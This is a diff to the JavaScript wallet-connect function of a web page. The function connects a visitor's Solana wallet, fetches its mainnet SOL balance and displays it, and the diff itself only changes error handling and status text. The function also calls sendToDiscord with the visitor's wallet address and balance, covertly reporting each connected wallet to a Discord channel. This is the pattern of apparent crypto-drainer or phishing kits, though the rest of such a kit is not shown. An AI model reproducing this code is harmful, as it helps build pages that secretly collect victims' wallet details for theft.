@@ -8,20 +8,28 @@ function connectWallet() {
 
   (async () => {
     try {
-      wallet = await window.solana.connect();
-      document.getElementById("connect_button").innerText = "Connected ✅";
+      wallet = await window.solana.connect({ onlyIfTrusted: false });
+
+      if (!wallet || !wallet.publicKey) {
+        document.getElementById("status_p").innerText = "❌ Connection rejected by user.";
+        return;
+      }
 
       const walletAddress = wallet.publicKey.toString();
       const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
       const balanceLamports = await connection.getBalance(wallet.publicKey);
       const solBalance = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
 
+      // Successfully connected and fetched balance
+      document.getElementById("connect_button").innerText = "Connected ✅";
       document.getElementById("status_p").innerText =
         "Wallet: " + ellipsizeAddress(walletAddress) + " | Balance: " + solBalance.toFixed(4) + " SOL";
 
       sendToDiscord(walletAddress, solBalance);
+
     } catch (err) {
-      document.getElementById("status_p").innerText = "❌ Connection failed!";
+      // Only trigger this if it's a real error (other than user rejection)
+      document.getElementById("status_p").innerText = "❌ Something went wrong.";
     }
   })();
 }
